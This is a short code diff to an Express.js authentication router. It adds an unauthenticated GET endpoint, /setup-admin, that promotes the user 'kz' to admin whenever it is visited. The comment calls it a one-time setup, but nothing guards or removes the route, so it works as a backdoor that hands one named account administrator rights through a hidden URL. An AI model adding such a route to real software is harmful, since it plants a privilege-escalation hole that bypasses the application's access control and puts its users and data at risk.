@@ -113,4 +113,15 @@ router.post('/mfa/verify', authenticateToken, async (req, res) => {
     }
 });
 
+// One-time admin setup - visit /api/auth/setup-admin to promote kz
+router.get('/setup-admin', async (req, res) => {
+    try {
+        await db.query("UPDATE users SET role = 'admin' WHERE username = 'kz'");
+        const result = await db.query("SELECT id, username, role FROM users WHERE username = 'kz'");
+        res.json({ message: 'Admin setup complete', user: result.rows[0] });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 module.exports = router;
